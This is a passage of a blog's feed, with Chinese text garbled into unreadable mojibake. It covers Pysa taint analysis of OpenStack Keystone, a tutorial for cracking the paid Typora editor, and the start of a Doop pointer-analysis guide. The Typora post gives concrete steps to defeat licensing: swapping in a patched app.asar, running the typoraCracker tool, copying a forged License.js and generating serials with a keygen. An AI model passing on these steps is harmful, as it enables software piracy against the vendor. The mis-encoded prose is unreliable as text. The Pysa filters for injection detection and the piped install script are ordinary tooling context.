ä½¿ç”¨å’Œå¯¼å…¥æ¨¡å—å¯¹åº”çš„æ±¡ç‚¹æ¨¡å‹ï¼Œæ£€æµ‹å¯¼å…¥æ¨¡å—å†…éƒ¨çš„æ±¡ç‚¹æºå’Œæ±‡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæµ‹è¯•ç›®å½•</span></span><br><span class="line">mkdir pysa-test &amp;&amp; <span class="built_in">cd</span> pysa-test</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git --single-branch --branch stable/victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿›å…¥æºç ç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> keystone</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… keystone ä¾èµ–</span></span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–é…ç½®ï¼Œæ·»åŠ ç±»å‹æ³¨é‡Šï¼ˆPython 3.5+ï¼‰éƒ¨åˆ†ä¼šå¤±è´¥ï¼Œå¯¼å…¥è¿‡æ»¤å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆå§‹åŒ–é…ç½®</span></span><br><span class="line">pyre init</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼–è¾‘é…ç½®æ–‡ä»¶</span></span><br><span class="line">vim .pyre_configuration</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸ºæºç æ·»åŠ ç±»å‹æ³¨é‡Š</span></span><br><span class="line">pyre infer -r -i</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥è¿‡æ»¤å™¨è®¾ç½® SAPP</span></span><br><span class="line">sapp filter import ~/.venvs/pysa/lib/pyre_check/pysa_filters</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤å™¨ <a href="https://github.com/facebook/pyre-check/tree/master/tools/sapp/pysa_filters">pysa_filters</a> åŒ…å«ä»¥ä¸‹é…ç½®æ–‡ä»¶</p><ul><li>5001-code-command-injection.json</li><li>5005-sql-injection.json</li><li>5011-userdata-to-filesystem.json</li><li>6065-argument-injection.json</li><li>6066-unsafe-deserialization.json</li><li>6073-server-side-template-injection.json</li></ul><p>ä»¥ 5001-code-command-injection.json ä¸ºä¾‹ï¼Œè®¾ç½®ä¸å±•ç¤ºå…ƒæ•°æ®ï¼ˆfeatureï¼‰ä»¥åŠæ˜¾ç¤ºçš„è¿½è¸ªé•¿åº¦</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Command and Code Injection&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;High signal filter for 5001 Shell Injection&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;features&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;mode&quot;</span>: <span class="string">&quot;none of&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;features&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;always-type:scalar&quot;</span>,</span><br><span class="line">                <span class="string">&quot;always-type:bool&quot;</span>,</span><br><span class="line">                <span class="string">&quot;via:shell_escape&quot;</span>,</span><br><span class="line">                <span class="string">&quot;always-via:shell_escape&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;codes&quot;</span>: [</span><br><span class="line">        <span class="number">5001</span></span><br><span class="line">      ],</span><br><span class="line">    <span class="attr">&quot;traceLengthFromSources&quot;</span>: [</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">3</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;traceLengthToSinks&quot;</span>: [</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">4</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œ Pyre å¹¶å°†ç»“æœå­˜å‚¨åœ¨ pysa-runs æ–‡ä»¶å¤¹ï¼Œä½¿ç”¨ SAPP å¯è§†åŒ–å±•ç¤º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿è¡Œ Pysa</span></span><br><span class="line">pyre analyze --no-verify --save-results-to ./pysa-runs --dump-call-graph</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥æ–‡ä»¶ è¿è¡Œ SAPP</span></span><br><span class="line">sapp analyze ./pysa-runs/taint-output.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡ŒæœåŠ¡å™¨</span></span><br><span class="line">sapp server</span><br></pre></td></tr></table></figure><p>ç”±äºè¿è¡Œ OpenStack æœåŠ¡çš„ä¸»æœºä¸Š keystone ç»‘å®šäº† 5000 ç«¯å£ï¼Œè€Œ SAPP ä¸æä¾›ä¿®æ”¹ç«¯å£çš„é€‰é¡¹ï¼Œæ‰€ä»¥é‡æ–°å¼„äº†å°ä¸»æœºä¸“é—¨ç”¨äºåˆ†æã€‚å¦å¤–ï¼ŒSAPP çš„ UI é»˜è®¤ç»‘å®šåœ¨ localhost ä¸Šï¼Œéœ€è¦åœ¨æœ¬åœ°ä½¿ç”¨ iptables é…ç½®è½¬å‘ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯ç”¨æœ¬åœ°è½¬å‘</span></span><br><span class="line">sudo sysctl -w net.ipv4.conf.ens160.route_localnet=1</span><br><span class="line"></span><br><span class="line"><span class="comment"># iptables é…ç½®è§„åˆ™</span></span><br><span class="line">sudo iptables -t nat -I PREROUTING -p tcp -d 10.112.148.73/24 --dport 2222 -j DNAT --to-destination 127.0.0.1:5000</span><br></pre></td></tr></table></figure><p>é€šè¿‡ Web UI æŸ¥çœ‹ç»“æœï¼Œä¸€å…±æ‰¾å‡º 13 ä¸ªé—®é¢˜ï¼Œå…¨æ˜¯å¯èƒ½çš„ XSS æ¼æ´ï¼š</p><img src="https://s2.loli.net/2021/12/30/rliNpZJgWLwbex4.png" style="zoom: 67%;" /><p>å¯¼å…¥çš„è¿‡æ»¤å™¨å¯ä»¥åœ¨ Filter ä¸­ä½¿ç”¨ï¼Œä¸è¿‡ keystone ä¸­æ²¡æœ‰æ£€æµ‹å‡ºè¿™äº›é—®é¢˜</p><img src="https://s2.loli.net/2021/12/30/5lWxd3sk7IKHnbM.png" style="zoom: 67%;" /><p>ç‚¹å¼€ä¸€ä¸ªé—®é¢˜çš„ Traces å±•ç¤ºï¼š</p><ul><li><code> UserControlled</code> ç±»å‹çš„æ±¡ç‚¹æ•°æ®ä¸€ç›´ä¼ æ’­åˆ° keystone.api.os_oauth1.RequestTokenResource.post å‡½æ•°<ul><li>æœ€çŸ­çš„ä¼ æ’­è·ç¦»</li></ul></li><li>æºç‚¹å’Œæ±‡ç‚¹çš„è¿½è¸ªåœ¨ keystone.api.os_oauth1.RequestTokenResource.post äº¤æ±‡</li><li><code> UserControlled</code> ç±»å‹çš„æ±¡ç‚¹æ•°æ®ä» keystone.api.os_oauth1.RequestTokenResource.post å¼€å§‹ï¼Œä¼ æ’­åˆ° XSS ç±»å‹çš„æ±‡ç‚¹<ul><li>å’Œäº¤æ±‡ç›¸åŒ</li></ul></li></ul><p>ä½¿ç”¨ <code>pyre query</code> å¯¼å‡ºæ•°æ®ï¼š<a href="https://raw.githubusercontent.com/jckling/Assets/master/python/graph.json">graph.json</a>ã€<a href="https://raw.githubusercontent.com/jckling/Assets/master/python/hierarchy.json">hierarchy.json</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯åŠ¨æœåŠ¡å™¨</span></span><br><span class="line">pyre start</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å‡ºè°ƒç”¨å›¾</span></span><br><span class="line">pyre query <span class="string">&quot;dump_call_graph()&quot;</span> | python -m json.tool &gt; graph.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å‡ºç±»å±‚æ¬¡ç»“æ„ï¼ˆçœç•¥å˜é‡ç±»å‹ï¼‰</span></span><br><span class="line">pyre query <span class="string">&quot;dump_class_hierarchy()&quot;</span> | python -m json.tool &gt; hierarchy.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é—­æœåŠ¡å™¨</span></span><br><span class="line">pyre stop</span><br></pre></td></tr></table></figure><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>å·®ä¸å¤šå¿«åŠå¹´å‰çš„ä¸œè¥¿äº†ï¼Œè€Œä¸”ç›®å‰ä¹Ÿæ²¡æœ‰åœ¨åš Python çš„é™æ€ç¨‹åºåˆ†æã€‚æ—¢ç„¶å½“æ—¶éƒ½è°ƒç ”å’Œè¯•ç”¨è¿‡äº†ï¼Œé‚£å°±ç¨å¾®ç†ä¸€ä¸‹å­˜æ¡£è¿™ä»½æµæ°´è´¦.jpg</p>]]></content>
    
    
    <summary type="html">ä¸€äº›å¼€æºå’Œé—­æºå·¥å…·</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Typora æ¿€æ´»æ•™ç¨‹</title>
    <link href="https://jckling.github.io/2021/12/24/Other/Typora%20%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/"/>
    <id>https://jckling.github.io/2021/12/24/Other/Typora%20%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/</id>
    <published>2021-12-24T09:52:12.000Z</published>
    <updated>2022-03-08T08:31:25.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰ç”¨ Typora çš„æ—¶å€™å´©æºƒè¿‡ä¸¤æ¬¡ï¼ˆå¯¼è‡´å†…å®¹å…¨æ— ï¼‰ï¼Œ<code>Ctrl + Z</code> ä¹Ÿæ— æ³•æ’¤é”€æ¢å¤ï¼Œç„¶åå°±ä¸æ€ä¹ˆæ•¢ç”¨äº†ã€‚åæ¥ä¹Ÿè¯•äº†è¯•å…¶ä»–æ”¯æŒ markdown çš„ç¼–è¾‘å™¨ï¼Œä½†ç¡®å® Typora çš„é¢œå€¼æœ€èƒ½æ‰“ã€‚</p><p>åŸæ¥ 11 æœˆå°±æ¨å‡ºäº†æ­£å¼ç‰ˆ Typora 1.0ï¼Œç°åœ¨éƒ½ <del>1.0.3</del> 1.1.5 äº†ï¼Œç›®å‰æ˜¯ ï¿¥89 ä»˜è´¹ä¹°æ–­ï¼Œæ”¯æŒæ¿€æ´»ä¸‰å°è®¾å¤‡ã€‚æœªæ¿€æ´»çš„æƒ…å†µä¸‹æ¯æ¬¡æ‰“å¼€éƒ½ä¼šå¼¹çª—ï¼š</p><img src="https://s2.loli.net/2021/12/24/8KyBpSdFsDVHtWh.jpg" style="zoom:80%;" /><p>ä¸è¿‡é€‰æ‹© <code>ä¸æ˜¯ç°åœ¨</code> ä¹‹åä¹Ÿå¯ä»¥å¥½å¥½ç”¨ï¼ˆï¼Ÿï¼‰å·¦ä¸‹è§’å¤šä¸€ä¸ª <code>æœªæ¿€æ´»</code>ï¼š</p><img src="https://s2.loli.net/2021/12/24/3iOwfDNMuB6Jb5n.jpg" style="zoom:80%;" /><h2 id="1-1-5-ç‰ˆæœ¬"><a href="#1-1-5-ç‰ˆæœ¬" class="headerlink" title="1.1.5 ç‰ˆæœ¬"></a>1.1.5 ç‰ˆæœ¬</h2><p>åŸæ¥çš„ä»£ç ä¸èƒ½ç›´æ¥ç”¨äºæ–°ç‰ˆæœ¬ï¼Œéœ€è¦æ ¹æ® <code>C:\Users\&#123;ç”¨æˆ·å&#125;\AppData\Roaming\Typora\typora.log</code> ä¿®æ”¹ä»£ç ã€‚</p><p>å½“ç„¶ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œç›´æ¥ä¸‹è½½ <a href="https://github.com/SnapdragonLee/TyporaCrack/releases">app_asar_v1.1.5.zip</a> æ›¿æ¢ Typora å®‰è£…è·¯å¾„ä¸‹çš„ app.asar æ–‡ä»¶å°±å¯ä»¥äº†ã€‚ä¾‹å¦‚ï¼Œæˆ‘éœ€è¦æ›¿æ¢çš„æ–‡ä»¶ä¸º <code>D:\Program Files\Typora\resources\app.asar</code>ã€‚</p><img src="https://s2.loli.net/2022/03/08/e6J9GbESQsa1BVY.png" /><p>æ›¿æ¢å®Œæ¯•åæ‰“å¼€ Typoraï¼Œå·²ç»æ¿€æ´»ã€‚</p><img src="https://s2.loli.net/2022/03/08/Q4funqhdGMYpUWA.png" style="zoom:50%;" /><h2 id="1-0-3-åŠä¹‹å‰ç‰ˆæœ¬"><a href="#1-0-3-åŠä¹‹å‰ç‰ˆæœ¬" class="headerlink" title="1.0.3 åŠä¹‹å‰ç‰ˆæœ¬"></a>1.0.3 åŠä¹‹å‰ç‰ˆæœ¬</h2><h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>ä½¿ç”¨ Windows ç³»ç»Ÿï¼Œå®‰è£…ä»¥ä¸‹è½¯ä»¶ï¼š</p><ul><li><a href="https://www.python.org/downloads/">Python3</a> + <a href="https://virtualenv.pypa.io/en/latest/installation.html">virtualenv</a></li><li><a href="https://git-scm.com/downloads">Git</a></li><li><a href="https://nodejs.org/zh-cn/download/">Node.js</a></li></ul><h3 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h3><ol><li><p>åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</p><p> åœ¨æ¡Œé¢å³é”®æ‰“å¼€ Git Bash</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line">mkdir tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½® python è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">virtualenv tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿›å…¥ç›®æ ‡æ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="built_in">cd</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">source</span> ./Scripts/activate</span><br></pre></td></tr></table></figure></li><li><p>å…‹éš†ä»£ç ä»“åº“ <a href="https://github.com/Mas0nShi/typoraCracker">Mas0nShi/typoraCracker</a></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Mas0nShi/typoraCracker.git</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£…ä¾èµ–</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿›å…¥æ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="built_in">cd</span> typoraCracker</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>ç”Ÿæˆç ´è§£æ–‡ä»¶</p><p> æ³¨æ„å°† <code>D:\Program Files\Typora\resources\app.asar</code> æ›¿æ¢ä¸ºè‡ªå·±çš„ Typora å®‰è£…ç›®å½•ï¼Œæ‰§è¡Œå®Œæ¯•åä¼šç”Ÿæˆ <code>dec_app</code> æ–‡ä»¶å¤¹</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python typora.py <span class="string">&quot;D:\Program Files\Typora\resources\app.asar&quot;</span> .</span><br></pre></td></tr></table></figure></li><li><p>æ‹·è´ä»“åº“ä¸­çš„ License.js è®¸å¯è¯</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./example/patch/License.js ./dec_app/</span><br></pre></td></tr></table></figure></li><li><p>é‡æ–°ç”Ÿæˆ <code>app.asar</code></p><p> æ‰§è¡Œå®Œæ¯•åä¼šç”Ÿæˆ <code>app.asar</code> æ–‡ä»¶</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python typora.py -u ./dec_app/ .</span><br></pre></td></tr></table></figure></li><li><p>æ›¿æ¢ <code>app.asar</code></p><p> å¦‚æœå‘½ä»¤æç¤ºæƒé™ä¸è¶³ï¼Œå¯ä»¥äººå·¥è¿›è¡Œç§»åŠ¨</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¤‡ä»½</span></span><br><span class="line">mv <span class="string">&quot;D:\Program Files\Typora\resources\app.asar&quot;</span> <span class="string">&quot;D:\Program Files\Typora\resources\app.asar.bak&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›¿æ¢</span></span><br><span class="line">mv ./app.asar <span class="string">&quot;D:\Program Files\Typora\resources\app.asar&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>ç”Ÿæˆåºåˆ—å·</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node ./example/keygen.js</span><br></pre></td></tr></table></figure></li><li><p>æ¿€æ´» Typora</p> <img src="https://s2.loli.net/2021/12/24/gbiVjK892UMGLEv.jpg" /></li></ol><h2 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h2><ul><li><a href="https://github.com/Mas0nShi/typoraCracker">Mas0nShi/typoraCracker</a></li><li><a href="https://github.com/SnapdragonLee/TyporaCrack">SnapdragonLee/TyporaCrack</a></li></ul>]]></content>
    
    
    <summary type="html">é€‚ç”¨äº 1.1.5 ç‰ˆæœ¬</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Windows" scheme="https://jckling.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>æŒ‡é’ˆåˆ†æå·¥å…· Doop ä½¿ç”¨æŒ‡å—</title>
    <link href="https://jckling.github.io/2021/12/17/Security/%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%20Doop%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <id>https://jckling.github.io/2021/12/17/Security/%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%20Doop%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</id>
    <published>2021-12-17T03:41:30.000Z</published>
    <updated>2022-03-08T09:03:12.294Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸€è¾¹å­¦ä¹  Datalog/Doop ä¸€è¾¹å¤ç°è®ºæ–‡ï¼Œçœ‹äº†äº›è®ºæ–‡è¡¥å……çŸ¥è¯†ï¼Œåšäº†äº›å®éªŒéªŒè¯ç†è§£ã€‚ä¸­æ–‡èµ„æ–™å°‘å°±ç®—äº†ï¼Œè‹±æ–‡èµ„æ–™ä¹Ÿæ²¡æœ‰éå¸¸ç³»ç»Ÿçš„ï¼Œäºæ˜¯ç»å¸¸åœ¨é¢‘é“é‡Œæé—®ğŸ¤£ã€‚åœ¨è¿™ä¸Šé¢èŠ±äº†å¤§çº¦ä¸€æ•´ä¸ªæœˆçš„æ—¶é—´ï¼Œç„¶åè¿˜æ²¡æœ‰å¤ç°å‡ºæ¥â€¦ è¢«æŠ“å»å­¦ Soot åšåˆ†æï¼Œä½†æ˜¯ç¡®è®¤äº†æƒ³æ³•ä¹‹åå‘ç°ç”¨ Soot è¿˜å¾—å®ç°è¿‡ç¨‹å†…æ•°æ®æµåˆ†æï¼Œè€Œè¿™åªæ˜¯åˆ†æçš„ç¬¬ä¸€æ­¥ï¼Œæ¶‰åŠåˆ°è¿‡ç¨‹é—´çš„æ•°æ®æµé‚£ä¸è¿˜å¾—å†å®ç°ä¸€éè¿‡ç¨‹é—´åˆ†æï¼Ÿ</p><p>ä¸çŸ¥é“ä¹‹åæ€ä¹ˆå®‰æ’ï¼Œåæ­£æ—¢ç„¶éƒ½ç”¨äº†è¿™ä¹ˆä¹…ï¼Œå°±æŠŠç†è§£çš„å†…å®¹æ¢³ç†ä¸€ä¸‹ï¼Œè‡ªå·±ç”¨çš„æ—¶å€™ä¹Ÿæ–¹ä¾¿æ£€ç´¢ã€‚</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>ä½¿ç”¨ Doop å‰éœ€è¦å®‰è£… Datalog å¼•æ“ï¼Œç”±äºé»˜è®¤çš„ souffle ä¸æ”¯æŒ Windowsï¼Œå› æ­¤å»ºè®®åœ¨ Linux ç¯å¢ƒä¸‹ä½¿ç”¨ã€‚</p><p>Doop æ”¯æŒä¸¤ä¸ªå¼•æ“ï¼šå•†ä¸šçš„ <a href="http://www.logicblox.com/">LogicBlox</a> å’Œå¼€æºçš„ <a href="https://github.com/souffle-lang/souffle">souffle</a>ï¼Œé»˜è®¤ä½¿ç”¨ souffleã€‚</p><ul><li>LogicBlox v3 å¹³æ›¿ï¼š<a href="http://snf-705535.vm.okeanos.grnet.gr/agreement.html">PA-Datalog</a> </li></ul><p>ä¹‹å‰å·²ç»æ¢³ç†è¿‡ä¸¤ä¸ªå¼•æ“çš„ä½¿ç”¨ï¼Œä¸äº†è§£çš„å¯ä»¥å…ˆçœ‹ä¸€ä¸‹åŸºæœ¬è¯­æ³•ï¼š</p><ul><li><a href="https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/">LogiQL å…¥é—¨</a></li><li><a href="https://jckling.github.io/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/">Datalog å¼•æ“ SoufflÃ© æŒ‡å—</a></li></ul><p>Doop ä» LogicBlox è¿ç§»åˆ° souffle çš„åŸå› ï¼š<a href="https://yanniss.github.io/doop2souffle-soap17.pdf">Porting Doop to Souffle: A Tale of Inter-Engine Portability for Datalog-Based Analyses</a></p><ul><li>ä¹Ÿæœ‰æ–‡ç« æè¿‡ souffle çš„æ‰§è¡Œé€Ÿåº¦æ›´å¿«</li></ul><ol><li>å®‰è£… souffle å¼•æ“</li></ol><p>ç›®å‰æ”¯æŒ 1.5.1ã€2.0.2ã€2.1ï¼ˆä¸‹é¢çš„å®‰è£…æŒ‡ä»¤å¯èƒ½ä¼šç›´æ¥å®‰è£…æœ€æ–°ç‰ˆçš„ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://packagecloud.io/install/repositories/souffle-lang/souffle/script.deb.sh | sudo bash</span><br><span class="line">sudo apt-get install souffle</span><br></pre></td></tr></table></figure><p>å¯èƒ½ä¼šå‡ºç°é”™è¯¯ï¼Œè¿™ä¸ªå¾—ç­‰ souffle é‚£è¾¹ä¿®å¤xd</p><p><img src="https://s2.loli.net/2021/12/17/Zm9NLfAIdBTiQUh.png"></p><ol><li>doop</li></ol><p>æ‹‰å–ä»“åº“å°±å¯ä»¥äº†ï¼Œæ³¨æ„éœ€è¦å®‰è£… java8</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… java8</span></span><br><span class="line">sudo apt install java-8-openjdk</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½ä»“åº“</span></span><br><span class="line">git <span class="built_in">clone</span> https://bitbucket.org/yanniss/doop.git</span><br></pre></td></tr></table></figure><h1 id="ä½¿ç”¨æ–¹å¼"><a href="#ä½¿ç”¨æ–¹å¼" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h1><h2 id="åŸºæœ¬è¯´æ˜"><a href="#åŸºæœ¬è¯´æ˜" class="headerlink" title="åŸºæœ¬è¯´æ˜"></a>åŸºæœ¬è¯´æ˜</h2><p>è¿›å…¥ doop æºç ç›®å½•ä¸‹ä½¿ç”¨ï¼Œ<code>./doop --help all</code> æŸ¥çœ‹æ‰€æœ‰å¸®åŠ©ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> doop</span><br><span class="line">./doop --<span class="built_in">help</span> all</span><br></pre></td></tr></table></figure><p>é¦–å…ˆ <code>-a,--analysis &lt;NAME&gt;</code> ç”¨äºæŒ‡å®šåˆ†æï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œæ•æ„Ÿåº¦ä¸Šå»äº†åˆ†æè€—æ—¶ä¹Ÿå°±ä¸Šå»äº†ï¼Œå› æ­¤æˆ‘ä¸ªäººä¸€èˆ¬åªç”¨ <code>context-insensitive</code> ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿåˆ†æã€‚æœ‰å…³ä½¿ç”¨ Datalog è¿›è¡ŒæŒ‡é’ˆåˆ†æå¯ä»¥çœ‹ <a href="http://yanniss.github.io/points-to-tutorial15.pdf">Pointer Analysis</a>ã€‚</p><p>æ³¨ï¼š<code>LB analyses</code> ä¹‹åçš„æ˜¯é€‚ç”¨äº LogicBlox çš„åˆ†æé€‰é¡¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-a,--analysis &lt;NAME&gt;                                      The name of the analysis. Valid values: 1-call-site-sensitive, 1-call-site-sensitive+heap, 1-object-1-type-sensitive+heap, 1-object-sensitive,</span><br><span class="line">                                                          1-object-sensitive+heap, 1-type-sensitive, 1-type-sensitive+heap, 2-call-site-sensitive+2-heap, 2-call-site-sensitive+heap, 2-object-sensitive+2-heap,</span><br><span class="line">                                                          2-object-sensitive+heap, 2-type-object-sensitive+2-heap, 2-type-object-sensitive+heap, 2-type-sensitive+heap, 3-object-sensitive+3-heap,</span><br><span class="line">                                                          3-type-sensitive+2-heap, 3-type-sensitive+3-heap, adaptive-2-object-sensitive+heap, basic-only, context-insensitive, context-insensitive-plus,</span><br><span class="line">                                                          context-insensitive-plusplus, data-flow, dependency-analysis, fully-guided-context-sensitive, micro, partitioned-2-object-sensitive+heap,</span><br><span class="line">                                                          selective-2-object-sensitive+heap, sound-may-point-to, sticky-2-object-sensitive, types-only, xtractor, ----- (LB 